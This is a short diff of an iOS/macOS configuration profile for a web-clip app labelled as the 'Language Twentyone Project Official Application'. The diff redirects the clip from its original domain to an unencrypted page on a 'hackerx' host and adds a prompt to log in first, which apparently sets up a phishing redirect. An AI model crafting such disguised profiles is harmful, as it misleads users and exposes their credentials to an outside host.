@@ -129,11 +129,11 @@ By visiting this page on our website: https://www.hackerx.xyz/contact</string>
 				<key>PayloadVersion</key>
 				<integer>1</integer>
 				<key>URL</key>
-				<string>https://language.twentyonecore.com/language/?username=21</string>
+				<string>http://lan.hackerx.xyz/runauto.html</string>
 			</dict>
 		</array>
 		<key>PayloadDescription</key>
-		<string>Language Twentyone Project Official Application. User connected with current version: 21</string>
+		<string>Language Twentyone Project Official Application. Before Launching App, Login.</string>
 		<key>PayloadDisplayName</key>
 		<string>Language Twentyone App</string>
 		<key>PayloadIdentifier</key>
